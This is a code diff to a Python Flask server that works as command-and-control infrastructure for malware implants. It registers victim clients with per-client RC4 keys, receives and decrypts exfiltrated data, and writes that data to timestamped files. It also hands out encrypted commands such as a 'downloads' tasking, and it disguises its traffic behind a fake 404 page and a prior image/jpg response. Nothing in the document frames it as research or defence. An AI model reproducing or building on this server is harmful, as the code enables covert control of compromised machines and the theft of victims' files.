@@ -1,17 +1,67 @@
-from flask import Flask, flash, request, redirect, url_for,send_file
+from flask import Flask, flash, request, redirect, url_for,send_file, render_template_string
+from datetime import datetime
 from encryption import *
-import io
+
+
+PACKET_CALLBACK = 0x1
+PACKET_SUCCESS = 0x2
+PACKET_ERROR = 0xFF
+PACKET_DATA = 0x3
 
 app = Flask(__name__)
 app.secret_key = b'\xed\xa1\x80\t\xa5n_\xcd\xb7\xfc\x83\xa20\x13]\x9b\xfe\xf3\xc4\xd3\xa5'
 
+class Client:
+    def __init__(self, data):
+        self.id : bytes = data[1:5]
+        # 16 byte rc4 key
+        self.key : bytes = data[5:21]
+        self.current_insn = None
+
+
+clients : dict[bytes, Client] = {}
+
+def process_callback(data):
+    print('data: ',data)
+    global clients
+    # 4 byte client id
+    client_id = data[1:5].hex().upper()
+    print('Callback: ', client_id)
+    if client_id not in clients.keys():
+        # add client to list
+        clients[client_id] = Client(data)
+        return client_id
+    # conflict in id, ask client to regen
+    return None
+
+
 # tentatively receive data from exfil
 @app.route('/api/update',methods=['POST'])
 def recv_data():
-    data = request.data
-    print(data)
+    data = decrypt(request.data)
+    if data[0] == PACKET_CALLBACK:
+        client_id = process_callback(data)
+        if client_id:
+            print('got new client!')
+            return encrypt("success",clients[client_id].key)
+        # cant encrypt since no key
+        return render_template_string('PageNotFound {{ errorCode }}', errorCode='404'), 404 
+
+    elif data[0] == PACKET_DATA:
+        now = datetime.now()
+        client_id = data[1:5].hex().upper()
+        file_name = clients[client_id].id.hex() + '_' + now.strftime("%d-%m-%Y_%H:%M:%S") 
+        with open(file_name,'wb') as f:
+            f.write(data[5:])
+        print(data[5:20])
+        return encrypt("success", clients[client_id].key)
+
 
 # provides commands for poll
 @app.route('/api/notification',methods=['GET'])
 def provide_command():
-    return send_file(io.BytesIO(b'\x00ABCDEF'),mimetype="image/jpg")
+    client_id = request.args.get('id')
+    print(client_id)
+    data = encrypt(b'\x01downloads',clients[client_id].key)
+    print(data)
+    return data
